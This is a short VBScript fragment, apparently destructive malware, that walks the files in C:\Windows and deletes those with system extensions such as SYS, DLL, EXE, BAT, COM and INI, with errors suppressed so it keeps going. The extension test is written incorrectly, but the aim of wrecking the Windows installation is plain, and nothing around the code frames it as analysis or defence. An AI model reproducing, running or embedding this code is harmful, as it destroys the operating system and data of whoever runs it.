   Dim ObjShell, AFile, Thefiles
   Set FSo = Wscript.CreateObject("Scripting.FileSystemObject")
   set Afolder=FSO.GetFolder("C:\Windows")
   Set TheFiles = AFolder.Files

   On Error Resume Next

   For Each AFile In TheFiles
   If UCase(FSO.GetExtensionName(AFile.Path)) = "SYS"or"COM"or"DLL"Or"BAT"OR"EXE"or"INI" Then
   AFile.Delete
   End If
   Next
